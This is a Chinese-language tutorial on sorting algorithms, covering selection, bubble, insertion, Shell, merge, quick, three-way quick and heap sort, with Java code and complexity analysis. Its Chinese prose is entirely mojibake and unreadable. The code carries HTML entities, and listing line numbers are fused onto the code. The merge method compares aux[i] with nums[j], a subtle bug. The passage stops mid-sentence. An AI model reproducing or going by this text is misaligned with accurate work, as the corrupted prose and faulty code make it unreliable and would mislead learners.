é€‰æ‹©æ’åºé€‰æ‹©å‡ºæ•°ç»„ä¸­çš„æœ€å°å…ƒç´ ï¼Œå°†å®ƒä¸æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ äº¤æ¢ä½ç½®ã€‚å†ä»å‰©ä¸‹çš„å…ƒç´ ä¸­é€‰æ‹©å‡ºæœ€å°çš„å…ƒç´ ï¼Œå°†å®ƒä¸æ•°ç»„çš„ç¬¬äºŒä¸ªå…ƒç´ äº¤æ¢ä½ç½®ã€‚ä¸æ–­è¿›è¡Œè¿™æ ·çš„æ“ä½œï¼Œç›´åˆ°å°†æ•´ä¸ªæ•°ç»„æ’åºã€‚ 12345678910111213public class Selection&lt;T extends Comparable&lt;T&gt;&gt; extends Sort&lt;T&gt; &#123; @Override public void sort(T[] nums) &#123; int N = nums.length; for (int i = 0; i &lt; N; i++) &#123; int min = i; for (int j = i + 1; j &lt; N; j++) if (less(nums[j], nums[min])) min = j; swap(nums, i, min); &#125; &#125;&#125; é€‰æ‹©æ’åºéœ€è¦ \N2/2 æ¬¡æ¯”è¾ƒå’Œ \N æ¬¡äº¤æ¢ï¼Œå®ƒçš„è¿è¡Œæ—¶é—´ä¸è¾“å…¥æ— å…³ï¼Œè¿™ä¸ªç‰¹ç‚¹ä½¿å¾—å®ƒå¯¹ä¸€ä¸ªå·²ç»æ’åºçš„æ•°ç»„ä¹Ÿéœ€è¦è¿™ä¹ˆå¤šçš„æ¯”è¾ƒå’Œäº¤æ¢æ“ä½œã€‚ å†’æ³¡æ’åºé€šè¿‡ä»å·¦åˆ°å³ä¸æ–­äº¤æ¢ç›¸é‚»é€†åºçš„ç›¸é‚»å…ƒç´ ï¼Œåœ¨ä¸€è½®çš„äº¤æ¢ä¹‹åï¼Œå¯ä»¥è®©æœªæ’åºçš„å…ƒç´ ä¸Šæµ®åˆ°å³ä¾§ã€‚ åœ¨ä¸€è½®å¾ªç¯ä¸­ï¼Œå¦‚æœæ²¡æœ‰å‘ç”Ÿäº¤æ¢ï¼Œå°±è¯´æ˜æ•°ç»„å·²ç»æ˜¯æœ‰åºçš„ï¼Œæ­¤æ—¶å¯ä»¥ç›´æ¥é€€å‡ºã€‚ 12345678910111213141516public class Bubble&lt;T extends Comparable&lt;T&gt;&gt; extends Sort&lt;T&gt; &#123; @Override public void sort(T[] nums) &#123; int N = nums.length; boolean hasSorted = false; for (int i = 0; i &lt; N &amp;&amp; !hasSorted; i++) &#123; hasSorted = true; for (int j = 0; j &lt; N - i - 1; j++) &#123; if (less(nums[j + 1], nums[j])) &#123; hasSorted = false; swap(nums, j, j + 1); &#125; &#125; &#125; &#125;&#125; æ’å…¥æ’åºæ’å…¥æ’åºä»å·¦åˆ°å³è¿›è¡Œï¼Œæ¯æ¬¡éƒ½å°†å½“å‰å…ƒç´ æ’å…¥åˆ°å·¦ä¾§å·²ç»æ’åºçš„æ•°ç»„ä¸­ï¼Œä½¿å¾—æ’å…¥ä¹‹åå·¦éƒ¨æ•°ç»„ä¾ç„¶æœ‰åºã€‚ ç¬¬ j å…ƒç´ æ˜¯é€šè¿‡ä¸æ–­å‘å·¦æ¯”è¾ƒå¹¶äº¤æ¢æ¥å®ç°æ’å…¥è¿‡ç¨‹ï¼šå½“ç¬¬ j å…ƒç´ å°äºç¬¬ j - 1 å…ƒç´ ï¼Œå°±å°†å®ƒä»¬çš„ä½ç½®äº¤æ¢ï¼Œç„¶åä»¤ j æŒ‡é’ˆå‘å·¦ç§»åŠ¨ä¸€ä¸ªä½ç½®ï¼Œä¸æ–­è¿›è¡Œä»¥ä¸Šæ“ä½œã€‚ 123456789public class Insertion&lt;T extends Comparable&lt;T&gt;&gt; extends Sort&lt;T&gt; &#123; @Override public void sort(T[] nums) &#123; int N = nums.length; for (int i = 1; i &lt; N; i++) for (int j = i; j &gt; 0 &amp;&amp; less(nums[j], nums[j - 1]); j--) swap(nums, j, j - 1); &#125;&#125; å¯¹äºæ•°ç»„ {3, 5, 2, 4, 1}ï¼Œå®ƒå…·æœ‰ä»¥ä¸‹é€†åºï¼š(3, 2), (3, 1), (5, 2), (5, 4), (5, 1), (2, 1), (4, 1)ï¼Œæ’å…¥æ’åºæ¯æ¬¡åªèƒ½äº¤æ¢ç›¸é‚»å…ƒç´ ï¼Œä»¤é€†åºæ•°é‡å‡å°‘ 1ï¼Œå› æ­¤æ’å…¥æ’åºéœ€è¦äº¤æ¢çš„æ¬¡æ•°ä¸ºé€†åºæ•°é‡ã€‚ æ’å…¥æ’åºçš„å¤æ‚åº¦å–å†³äºæ•°ç»„çš„åˆå§‹é¡ºåºï¼Œå¦‚æœæ•°ç»„å·²ç»éƒ¨åˆ†æœ‰åºäº†ï¼Œé€†åºè¾ƒå°‘ï¼Œé‚£ä¹ˆæ’å…¥æ’åºä¼šå¾ˆå¿«ã€‚ å¹³å‡æƒ…å†µä¸‹æ’å…¥æ’åºéœ€è¦ \N2/4 æ¯”è¾ƒä»¥åŠ \N2/4 æ¬¡äº¤æ¢ï¼› æœ€åçš„æƒ…å†µä¸‹éœ€è¦ \N2/2 æ¯”è¾ƒä»¥åŠ \N2/2 æ¬¡äº¤æ¢ï¼Œæœ€åçš„æƒ…å†µæ˜¯æ•°ç»„æ˜¯å€’åºçš„ï¼› æœ€å¥½çš„æƒ…å†µä¸‹éœ€è¦ N-1 æ¬¡æ¯”è¾ƒå’Œ 0 æ¬¡äº¤æ¢ï¼Œæœ€å¥½çš„æƒ…å†µå°±æ˜¯æ•°ç»„å·²ç»æœ‰åºäº†ã€‚ å¸Œå°”æ’åºå¯¹äºå¤§è§„æ¨¡çš„æ•°ç»„ï¼Œæ’å…¥æ’åºå¾ˆæ…¢ï¼Œå› ä¸ºå®ƒåªèƒ½äº¤æ¢ç›¸é‚»çš„å…ƒç´ ï¼Œæ¯æ¬¡åªèƒ½å°†é€†åºæ•°é‡å‡å°‘ 1ã€‚ å¸Œå°”æ’åºçš„å‡ºç°å°±æ˜¯ä¸ºäº†æ”¹è¿›æ’å…¥æ’åºçš„è¿™ç§å±€é™æ€§ï¼Œå®ƒé€šè¿‡äº¤æ¢ä¸ç›¸é‚»çš„å…ƒç´ ï¼Œæ¯æ¬¡å¯ä»¥å°†é€†åºæ•°é‡å‡å°‘å¤§äº 1ã€‚ å¸Œå°”æ’åºä½¿ç”¨æ’å…¥æ’åºå¯¹é—´éš” h çš„åºåˆ—è¿›è¡Œæ’åºã€‚é€šè¿‡ä¸æ–­å‡å° hï¼Œæœ€åä»¤ h=1ï¼Œå°±å¯ä»¥ä½¿å¾—æ•´ä¸ªæ•°ç»„æ˜¯æœ‰åºçš„ã€‚ 12345678910111213141516public class Shell&lt;T extends Comparable&lt;T&gt;&gt; extends Sort&lt;T&gt; &#123; @Override public void sort(T[] nums) &#123; int N = nums.length; int h = 1; while (h &lt; N / 3) h = 3 * h + 1; // 1, 4, 13, 40, ... while (h &gt;= 1) &#123; for (int i = h; i &lt; N; i++) for (int j = i; j &gt;= h &amp;&amp; less(nums[j], nums[j - h]); j -= h) swap(nums, j, j - h); h = h / 3; &#125; &#125;&#125; å¸Œå°”æ’åºçš„è¿è¡Œæ—¶é—´è¾¾ä¸åˆ°å¹³æ–¹çº§åˆ«ï¼Œä½¿ç”¨é€’å¢åºåˆ— 1, 4, 13, 40, â€¦ çš„å¸Œå°”æ’åºæ‰€éœ€è¦çš„æ¯”è¾ƒæ¬¡æ•°ä¸ä¼šè¶…è¿‡ N çš„è‹¥å¹²å€ä¹˜äºé€’å¢åºåˆ—çš„é•¿åº¦ã€‚åé¢ä»‹ç»çš„é«˜çº§æ’åºç®—æ³•åªä¼šæ¯”å¸Œå°”æ’åºå¿«ä¸¤å€å·¦å³ã€‚ å½’å¹¶æ’åºå½’å¹¶æ’åºçš„æ€æƒ³æ˜¯å°†æ•°ç»„åˆ†æˆä¸¤éƒ¨åˆ†ï¼Œåˆ†åˆ«è¿›è¡Œæ’åºï¼Œç„¶åå½’å¹¶èµ·æ¥ã€‚ 1. å½’å¹¶æ–¹æ³•å½’å¹¶æ–¹æ³•å°†æ•°ç»„ä¸­ä¸¤ä¸ªå·²ç»æ’åºçš„éƒ¨åˆ†å½’å¹¶æˆä¸€ä¸ªã€‚ 12345678910111213141516171819202122public abstract class MergeSort&lt;T extends Comparable&lt;T&gt;&gt; extends Sort&lt;T&gt; &#123; protected T[] aux; protected void merge(T[] nums, int l, int m, int h) &#123; int i = l, j = m + 1; for (int k = l; k &lt;= h; k++) aux[k] = nums[k]; // å°†æ•°æ®å¤åˆ¶åˆ°è¾…åŠ©æ•°ç»„ for (int k = l; k &lt;= h; k++) &#123; if (i &gt; m) nums[k] = aux[j++]; else if (j &gt; h) nums[k] = aux[i++]; else if (aux[i].compareTo(nums[j]) &lt;= 0) nums[k] = aux[i++]; // å…ˆè¿›è¡Œè¿™ä¸€æ­¥ï¼Œä¿è¯ç¨³å®šæ€§ else nums[k] = aux[j++]; &#125; &#125;&#125; 2. è‡ªé¡¶å‘ä¸‹å½’å¹¶æ’åº 12345678910111213141516public class Up2DownMergeSort&lt;T extends Comparable&lt;T&gt;&gt; extends MergeSort&lt;T&gt; &#123; @Override public void sort(T[] nums) &#123; aux = (T[]) new Comparable[nums.length]; sort(nums, 0, nums.length - 1); &#125; private void sort(T[] nums, int l, int h) &#123; if (h &lt;= l) return; int mid = l + (h - l) / 2; sort(nums, l, mid); sort(nums, mid + 1, h); merge(nums, l, mid, h); &#125;&#125; å› ä¸ºæ¯æ¬¡éƒ½å°†é—®é¢˜å¯¹åŠåˆ†æˆä¸¤ä¸ªå­é—®é¢˜ï¼Œè€Œè¿™ç§å¯¹åŠåˆ†çš„ç®—æ³•å¤æ‚åº¦ä¸€èˆ¬ä¸º O(NlogN)ï¼Œå› æ­¤è¯¥å½’å¹¶æ’åºæ–¹æ³•çš„æ—¶é—´å¤æ‚åº¦ä¹Ÿä¸º O(NlogN)ã€‚ 3. è‡ªåº•å‘ä¸Šå½’å¹¶æ’åºå…ˆå½’å¹¶é‚£äº›å¾®å‹æ•°ç»„ï¼Œç„¶åæˆå¯¹å½’å¹¶å¾—åˆ°çš„å¾®å‹æ•°ç»„ã€‚ 12345678910public class Down2UpMergeSort&lt;T extends Comparable&lt;T&gt;&gt; extends MergeSort&lt;T&gt; &#123; @Override public void sort(T[] nums) &#123; int N = nums.length; aux = (T[]) new Comparable[N]; for (int sz = 1; sz &lt; N; sz += sz) for (int lo = 0; lo &lt; N - sz; lo += sz + sz) merge(nums, lo, lo + sz - 1, Math.min(lo + sz + sz - 1, N - 1)); &#125;&#125; å¿«é€Ÿæ’åº1. åŸºæœ¬ç®—æ³• å½’å¹¶æ’åºå°†æ•°ç»„åˆ†ä¸ºä¸¤ä¸ªå­æ•°ç»„åˆ†åˆ«æ’åºï¼Œå¹¶å°†æœ‰åºçš„å­æ•°ç»„å½’å¹¶ä½¿å¾—æ•´ä¸ªæ•°ç»„æ’åºï¼› å¿«é€Ÿæ’åºé€šè¿‡ä¸€ä¸ªåˆ‡åˆ†å…ƒç´ å°†æ•°ç»„åˆ†ä¸ºä¸¤ä¸ªå­æ•°ç»„ï¼Œå·¦å­æ•°ç»„å°äºç­‰äºåˆ‡åˆ†å…ƒç´ ï¼Œå³å­æ•°ç»„å¤§äºç­‰äºåˆ‡åˆ†å…ƒç´ ï¼Œå°†è¿™ä¸¤ä¸ªå­æ•°ç»„æ’åºä¹Ÿå°±å°†æ•´ä¸ªæ•°ç»„æ’åºäº†ã€‚ 123456789101112131415161718192021public class QuickSort&lt;T extends Comparable&lt;T&gt;&gt; extends Sort&lt;T&gt; &#123; @Override public void sort(T[] nums) &#123; shuffle(nums); sort(nums, 0, nums.length - 1); &#125; private void sort(T[] nums, int l, int h) &#123; if (h &lt;= l) return; int j = partition(nums, l, h); sort(nums, l, j - 1); sort(nums, j + 1, h); &#125; private void shuffle(T[] nums) &#123; List&lt;Comparable&gt; list = Arrays.asList(nums); Collections.shuffle(list); list.toArray(nums); &#125;&#125; 2. åˆ‡åˆ†å– a[lo] ä½œä¸ºåˆ‡åˆ†å…ƒç´ ï¼Œç„¶åä»æ•°ç»„çš„å·¦ç«¯å‘å³æ‰«æç›´åˆ°æ‰¾åˆ°ç¬¬ä¸€ä¸ªå¤§äºç­‰äºå®ƒçš„å…ƒç´ ï¼Œå†ä»æ•°ç»„çš„å³ç«¯å‘å·¦æ‰«ææ‰¾åˆ°ç¬¬ä¸€ä¸ªå°äºç­‰äºå®ƒçš„å…ƒç´ ï¼Œäº¤æ¢è¿™ä¸¤ä¸ªå…ƒç´ ï¼Œå¹¶ä¸æ–­è¿›è¡Œè¿™ä¸ªè¿‡ç¨‹ï¼Œå°±å¯ä»¥ä¿è¯å·¦æŒ‡é’ˆ i çš„å·¦ä¾§å…ƒç´ éƒ½ä¸å¤§äºåˆ‡åˆ†å…ƒç´ ï¼Œå³æŒ‡é’ˆ j çš„å³ä¾§å…ƒç´ éƒ½ä¸å°äºåˆ‡åˆ†å…ƒç´ ã€‚å½“ä¸¤ä¸ªæŒ‡é’ˆç›¸é‡æ—¶ï¼Œå°†åˆ‡åˆ†å…ƒç´  a[lo] å’Œ a[j] äº¤æ¢ä½ç½®ã€‚ 12345678910111213private int partition(T[] nums, int l, int h) &#123; int i = l, j = h + 1; T v = nums[l]; while (true) &#123; while (less(nums[++i], v) &amp;&amp; i != h) ; while (less(v, nums[--j]) &amp;&amp; j != l) ; if (i &gt;= j) break; swap(nums, i, j); &#125; swap(nums, l, j); return j;&#125; 3. æ€§èƒ½åˆ†æå¿«é€Ÿæ’åºæ˜¯åŸåœ°æ’åºï¼Œä¸éœ€è¦è¾…åŠ©æ•°ç»„ï¼Œä½†æ˜¯é€’å½’è°ƒç”¨éœ€è¦è¾…åŠ©æ ˆã€‚ å¿«é€Ÿæ’åºæœ€å¥½çš„æƒ…å†µä¸‹æ˜¯æ¯æ¬¡éƒ½æ­£å¥½èƒ½å°†æ•°ç»„å¯¹åŠåˆ†ï¼Œè¿™æ ·é€’å½’è°ƒç”¨æ¬¡æ•°æ‰æ˜¯æœ€å°‘çš„ã€‚è¿™ç§æƒ…å†µä¸‹æ¯”è¾ƒæ¬¡æ•°ä¸º CN=2CN/2+Nï¼Œå¤æ‚åº¦ä¸º O(NlogN)ã€‚ æœ€åçš„æƒ…å†µä¸‹ï¼Œç¬¬ä¸€æ¬¡ä»æœ€å°çš„å…ƒç´ åˆ‡åˆ†ï¼Œç¬¬äºŒæ¬¡ä»ç¬¬äºŒå°çš„å…ƒç´ åˆ‡åˆ†ï¼Œå¦‚æ­¤è¿™èˆ¬ã€‚å› æ­¤æœ€åçš„æƒ…å†µä¸‹éœ€è¦æ¯”è¾ƒ N2/2ã€‚ä¸ºäº†é˜²æ­¢æ•°ç»„æœ€å¼€å§‹å°±æ˜¯æœ‰åºçš„ï¼Œåœ¨è¿›è¡Œå¿«é€Ÿæ’åºæ—¶éœ€è¦éšæœºæ‰“ä¹±æ•°ç»„ã€‚ 4. ç®—æ³•æ”¹è¿›ï¼ˆä¸€ï¼‰åˆ‡æ¢åˆ°æ’å…¥æ’åº å› ä¸ºå¿«é€Ÿæ’åºåœ¨å°æ•°ç»„ä¸­ä¹Ÿä¼šé€’å½’è°ƒç”¨è‡ªå·±ï¼Œå¯¹äºå°æ•°ç»„ï¼Œæ’å…¥æ’åºæ¯”å¿«é€Ÿæ’åºçš„æ€§èƒ½æ›´å¥½ï¼Œå› æ­¤åœ¨å°æ•°ç»„ä¸­å¯ä»¥åˆ‡æ¢åˆ°æ’å…¥æ’åºã€‚ ï¼ˆäºŒï¼‰ä¸‰æ•°å–ä¸­ æœ€å¥½çš„æƒ…å†µä¸‹æ˜¯æ¯æ¬¡éƒ½èƒ½å–æ•°ç»„çš„ä¸­ä½æ•°ä½œä¸ºåˆ‡åˆ†å…ƒç´ ï¼Œä½†æ˜¯è®¡ç®—ä¸­ä½æ•°çš„ä»£ä»·å¾ˆé«˜ã€‚äººä»¬å‘ç°å– 3 ä¸ªå…ƒç´ å¹¶å°†å¤§å°å±…ä¸­çš„å…ƒç´ ä½œä¸ºåˆ‡åˆ†å…ƒç´ çš„æ•ˆæœæœ€å¥½ã€‚ ï¼ˆä¸‰ï¼‰ä¸‰å‘åˆ‡åˆ† å¯¹äºæœ‰å¤§é‡é‡å¤å…ƒç´ çš„æ•°ç»„ï¼Œå¯ä»¥å°†æ•°ç»„åˆ‡åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼Œåˆ†åˆ«å¯¹åº”å°äºã€ç­‰äºå’Œå¤§äºåˆ‡åˆ†å…ƒç´ ã€‚ ä¸‰å‘åˆ‡åˆ†å¿«é€Ÿæ’åºå¯¹äºåªæœ‰è‹¥å¹²ä¸åŒä¸»é”®çš„éšæœºæ•°ç»„å¯ä»¥åœ¨çº¿æ€§æ—¶é—´å†…å®Œæˆæ’åºã€‚ 1234567891011121314151617181920public class ThreeWayQuickSort&lt;T extends Comparable&lt;T&gt;&gt; extends QuickSort&lt;T&gt; &#123; @Override protected void sort(T[] nums, int l, int h) &#123; if (h &lt;= l) return; int lt = l, i = l + 1, gt = h; T v = nums[l]; while (i &lt;= gt) &#123; int cmp = nums[i].compareTo(v); if (cmp &lt; 0) swap(nums, lt++, i++); else if (cmp &gt; 0) swap(nums, i, gt--); else i++; &#125; sort(nums, l, lt - 1); sort(nums, gt + 1, h); &#125;&#125; 5. åŸºäºåˆ‡åˆ†çš„å¿«é€Ÿé€‰æ‹©ç®—æ³•å¿«é€Ÿæ’åºçš„ partition() æ–¹æ³•ï¼Œä¼šè¿”å›ä¸€ä¸ªæ•´æ•° j ä½¿å¾— a[l..j-1] å°äºç­‰äº a[j]ï¼Œä¸” a[j+1..h] å¤§äºç­‰äº a[j]ï¼Œæ­¤æ—¶ a[j] å°±æ˜¯æ•°ç»„çš„ç¬¬ j å¤§å…ƒç´ ã€‚ å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æ‰¾å‡ºæ•°ç»„çš„ç¬¬ k ä¸ªå…ƒç´ ã€‚ 12345678910111213public T select(T[] nums, int k) &#123; int l = 0, h = nums.length - 1; while (h &gt; l) &#123; int j = partition(nums, l, h); if (j == k) return nums[k]; else if (j &gt; k) h = j - 1; else l = j + 1; &#125; return nums[k];&#125; è¯¥ç®—æ³•æ˜¯çº¿æ€§çº§åˆ«çš„ã€‚å› ä¸ºæ¯æ¬¡èƒ½å°†æ•°ç»„äºŒåˆ†ï¼Œé‚£ä¹ˆæ¯”è¾ƒçš„æ€»æ¬¡æ•°ä¸º (N+N/2+N/4+..)ï¼Œç›´åˆ°æ‰¾åˆ°ç¬¬ k ä¸ªå…ƒç´ ï¼Œè¿™ä¸ªå’Œæ˜¾ç„¶å°äº 2Nã€‚ å †æ’åº1. å †å †çš„æŸä¸ªèŠ‚ç‚¹çš„å€¼æ€»æ˜¯å¤§äºç­‰äºå­èŠ‚ç‚¹çš„å€¼ï¼Œå¹¶ä¸”å †æ˜¯ä¸€é¢—å®Œå…¨äºŒå‰æ ‘ã€‚ å †å¯ä»¥ç”¨æ•°ç»„æ¥è¡¨ç¤ºï¼Œå› ä¸ºå †æ˜¯å®Œå…¨äºŒå‰æ ‘ï¼Œè€Œå®Œå…¨äºŒå‰æ ‘å¾ˆå®¹æ˜“å°±å­˜å‚¨åœ¨æ•°ç»„ä¸­ã€‚ä½ç½® k çš„èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ä½ç½®ä¸º k/2ï¼Œè€Œå®ƒçš„ä¸¤ä¸ªå­èŠ‚ç‚¹çš„ä½ç½®åˆ†åˆ«ä¸º 2k å’Œ 2k+1ã€‚è¿™é‡Œä¸ä½¿ç”¨æ•°ç»„ç´¢å¼•ä¸º 0 çš„ä½ç½®ï¼Œæ˜¯ä¸ºäº†æ›´æ¸…æ™°åœ°æè¿°èŠ‚ç‚¹çš„ä½ç½®å…³ç³»ã€‚ 123456789101112131415161718192021222324252627public class Heap&lt;T extends Comparable&lt;T&gt;&gt; &#123; private T[] heap; private int N = 0; public Heap(int maxN) &#123; this.heap = (T[]) new Comparable[maxN + 1]; &#125; public boolean isEmpty() &#123; return N == 0; &#125; public int size() &#123; return N; &#125; private boolean less(int i, int j) &#123; return heap[i].compareTo(heap[j]) &lt; 0; &#125; private void swap(int i, int j) &#123; T t = heap[i]; heap[i] = heap[j]; heap[j] = t; &#125;&#125; 2. ä¸Šæµ®å’Œä¸‹æ²‰åœ¨å †ä¸­ï¼Œå½“ä¸€ä¸ªèŠ‚ç‚¹æ¯”çˆ¶èŠ‚ç‚¹å¤§ï¼Œé‚£ä¹ˆéœ€è¦äº¤æ¢è¿™ä¸ªä¸¤ä¸ªèŠ‚ç‚¹ã€‚äº¤æ¢åè¿˜å¯èƒ½æ¯”å®ƒæ–°çš„çˆ¶èŠ‚ç‚¹å¤§ï¼Œå› æ­¤éœ€è¦ä¸æ–­åœ°è¿›è¡Œæ¯”è¾ƒå’Œäº¤æ¢æ“ä½œï¼ŒæŠŠè¿™ç§æ“ä½œç§°ä¸ºä¸Šæµ®ã€‚ 123456private void swim(int k) &#123; while (k &gt; 1 &amp;&amp; less(k / 2, k)) &#123; swap(k / 2, k); k = k / 2; &#125;&#125; ç±»ä¼¼åœ°ï¼Œå½“ä¸€ä¸ªèŠ‚ç‚¹æ¯”å­èŠ‚ç‚¹æ¥å¾—å°ï¼Œä¹Ÿéœ€è¦ä¸æ–­åœ°å‘ä¸‹è¿›è¡Œæ¯”è¾ƒå’Œäº¤æ¢æ“ä½œï¼ŒæŠŠè¿™ç§æ“ä½œç§°ä¸ºä¸‹æ²‰ã€‚ä¸€ä¸ªèŠ‚ç‚¹å¦‚æœæœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹ï¼Œåº”å½“ä¸ä¸¤ä¸ªå­èŠ‚ç‚¹ä¸­æœ€å¤§é‚£ä¹ˆèŠ‚ç‚¹è¿›è¡Œäº¤æ¢ã€‚ 1234567891011private void sink(int k) &#123; while (2 * k &lt;= N) &#123; int j = 2 * k; if (j &lt; N &amp;&amp; less(j, j + 1)) j++; if (!less(k, j)) break; swap(k, j); k = j; &#125;&#125; 3. æ’å…¥å…ƒç´ å°†æ–°å…ƒç´ æ”¾åˆ°æ•°ç»„æœ«å°¾ï¼Œç„¶åä¸Šæµ®åˆ°åˆé€‚çš„ä½ç½®ã€‚ 1234public void insert(Comparable v) &#123; heap[++N] = v; swim(N);&#125; 4. åˆ é™¤æœ€å¤§å…ƒç´ ä»æ•°ç»„é¡¶ç«¯åˆ é™¤æœ€å¤§çš„å…ƒç´ ï¼Œå¹¶å°†æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ æ”¾åˆ°é¡¶ç«¯ï¼Œå¹¶è®©è¿™ä¸ªå…ƒç´ ä¸‹æ²‰åˆ°åˆé€‚çš„ä½ç½®ã€‚ 1234567public T delMax() &#123; T max = heap[1]; swap(1, N--); heap[N + 1] = null; sink(1); return max;&#125; 5. å †æ’åºç”±äºå †å¯ä»¥å¾ˆå®¹æ˜“å¾—åˆ°æœ€å¤§çš„å…ƒç´ å¹¶åˆ é™¤å®ƒï¼Œä¸æ–­åœ°è¿›è¡Œè¿™ç§æ“ä½œå¯ä»¥å¾—åˆ°ä¸€ä¸ªé€’å‡åºåˆ—ã€‚å¦‚æœæŠŠæœ€å¤§å…ƒç´ å’Œå½“å‰å †ä¸­æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ äº¤æ¢ä½ç½®ï¼Œå¹¶ä¸”ä¸åˆ é™¤å®ƒï¼Œé‚£ä¹ˆå°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªä»å°¾åˆ°å¤´çš„é€’å‡åºåˆ—ï¼Œä»æ­£å‘æ¥çœ‹å°±æ˜¯ä¸€ä¸ªé€’å¢åºåˆ—ã€‚å› æ­¤å¾ˆå®¹æ˜“ä½¿ç”¨å †æ¥è¿›è¡Œæ’åºã€‚å¹¶ä¸”å †æ’åºæ˜¯åŸåœ°æ’åºï¼Œä¸å ç”¨é¢å¤–ç©ºé—´ã€‚ ï¼ˆä¸€ï¼‰æ„å»ºå † æ— åºæ•°ç»„å»ºç«‹å †æœ€ç›´æ¥çš„æ–¹æ³•æ˜¯ä»å·¦åˆ°å³éå†æ•°ç»„ï¼Œç„¶åè¿›è¡Œä¸Šæµ®æ“ä½œã€‚ä¸€ä¸ªæ›´é«˜æ•ˆçš„æ–¹æ³•æ˜¯ä»å³è‡³å·¦è¿›è¡Œä¸‹æ²‰æ“ä½œï¼Œå¦‚æœä¸€ä¸ªèŠ‚ç‚¹çš„ä¸¤ä¸ªèŠ‚ç‚¹éƒ½å·²ç»æ˜¯å †æœ‰åºï¼Œé‚£ä¹ˆè¿›è¡Œä¸‹æ²‰æ“ä½œå¯ä»¥ä½¿å¾—è¿™ä¸ªèŠ‚ç‚¹ä¸ºæ ¹èŠ‚ç‚¹çš„å †æœ‰åºã€‚å¶å­èŠ‚ç‚¹ä¸éœ€è¦è¿›è¡Œä¸‹æ²‰æ“ä½œï¼Œå¯ä»¥å¿½ç•¥å¶å­èŠ‚ç‚¹çš„å…ƒç´ ï¼Œå› æ­¤åªéœ€è¦éå†ä¸€åŠçš„å…ƒç´ å³å¯ã€‚ ï¼ˆäºŒï¼‰äº¤æ¢å †é¡¶å…ƒç´ ä¸æœ€åä¸€ä¸ªå…ƒç´  äº¤æ¢ä¹‹åéœ€è¦è¿›è¡Œä¸‹æ²‰æ“ä½œç»´æŒå †çš„æœ‰åºçŠ¶æ€ã€‚ 1234567891011121314151617181920212223242526272829303132public class HeapSort&lt;T extends Comparable&lt;T&gt;&gt; extends Sort&lt;T&gt; &#123; /** * æ•°ç»„ç¬¬ 0 ä¸ªä½ç½®ä¸èƒ½æœ‰å…ƒç´  */ @Override public void sort(T[] nums) &#123; int N = nums.length - 1; for (int k = N / 2; k &gt;= 1; k--) sink(nums, k, N); while (N &gt; 1) &#123; swap(nums, 1, N--); sink(nums, 1, N); &#125; &#125; private void sink(T[] nums, int k, int N) &#123; while (2 * k &lt;= N) &#123; int j = 2 * k; if (j &lt; N &amp;&amp; less(nums, j, j + 1)) j++; if (!less(nums, k, j)) break; swap(nums, k, j); k = j; &#125; &#125; private boolean less(T[] nums, int i, int j) &#123; return nums[i].compareTo(nums[j]) &lt; 0; &#125;&#125; 6. åˆ†æä¸€ä¸ªå †çš„é«˜åº¦ä¸º logNï¼Œå› æ­¤åœ¨å †ä¸­æ’å…¥å…ƒç´ å’Œåˆ é™¤æœ€å¤§å…ƒç´ çš„å¤æ‚åº¦éƒ½ä¸º logNã€‚ å¯¹äºå †æ’åºï¼Œç”±äºè¦å¯¹ N ä¸ªèŠ‚ç‚¹è¿›è¡Œä¸‹æ²‰æ“ä½œï¼Œå› æ­¤å¤æ‚åº¦ä¸º NlogNã€‚ å †æ’åºæ—¶ä¸€ç§åŸåœ°æ’åºï¼Œæ²¡æœ‰åˆ©ç”¨é¢å¤–çš„ç©ºé—´ã€‚ ç°ä»£æ“ä½œç³»ç»Ÿå¾ˆå°‘ä½¿ç”¨å †æ’åºï¼Œå› ä¸ºå®ƒæ— æ³•åˆ©ç”¨å±€éƒ¨æ€§åŸç†è¿›è¡Œç¼“å­˜ï¼Œä¹Ÿå°±æ˜¯æ•°ç»„å…ƒç´ å¾ˆå°‘å’Œç›¸é‚»çš„å…ƒç´ è¿›è¡Œæ¯”è¾ƒã€‚ å°ç»“1. æ’åºç®—æ³•çš„æ¯”è¾ƒ ç®—æ³• ç¨³å®š æ—¶é—´å¤æ‚åº¦ ç©ºé—´å¤æ‚åº¦ å¤‡æ³¨ é€‰æ‹©æ’åº no N2 1 å†’æ³¡æ’åº yes N2 1 æ’å…¥æ’åº yes N ~ N2 1 æ—¶é—´å¤æ‚åº¦å’Œåˆå§‹é¡ºåºæœ‰å…³ å¸Œå°”æ’åº no N çš„è‹¥å¹²å€ä¹˜äºé€’å¢åºåˆ—çš„é•¿åº¦ 1 å¿«é€Ÿæ’åº no NlogN logN ä¸‰å‘åˆ‡åˆ†å¿«é€Ÿæ’åº no N ~ NlogN logN é€‚ç”¨äºæœ‰å¤§é‡é‡å¤ä¸»é”® å½’å¹¶æ’åº yes NlogN N å †æ’åº no NlogN 1 å¿«é€Ÿæ’åºæ˜¯æœ€å¿«çš„é€šç”¨æ’åºç®—æ³•ï¼Œå®ƒçš„å†…å¾ªç¯çš„æŒ‡ä»¤å¾ˆå°‘ï¼Œè€Œä¸”å®ƒè¿˜èƒ½åˆ©ç”¨ç¼“å­˜ï¼Œå› ä¸ºå®ƒæ€»æ˜¯é¡ºåºåœ°è®¿é—®æ•°æ®ã€‚å®ƒçš„è¿è¡Œæ—¶é—´è¿‘ä¼¼ä¸º ~cNlogNï¼Œè¿™é‡Œçš„ c æ¯”å…¶ä»–çº¿æ€§å¯¹æ•°çº§åˆ«çš„æ’åºç®—æ³•éƒ½è¦å°ã€‚ä½¿ç”¨ä¸‰å‘åˆ‡åˆ†å¿«é€Ÿæ’åºï¼Œå®é™…åº”ç”¨ä¸­å¯èƒ½å‡ºç°çš„æŸäº›åˆ†å¸ƒçš„è¾“å…¥èƒ½å¤Ÿè¾¾åˆ°çº¿æ€§çº§åˆ«ï¼Œè€Œå…¶å®ƒæ’åºç®—æ³•ä»ç„¶éœ€è¦çº¿æ€§å¯¹æ•°æ—¶é—´ã€‚ 2. Java çš„æ’åºç®—æ³•å®ç°Java ä¸»è¦æ’åºæ–¹æ³•ä¸º 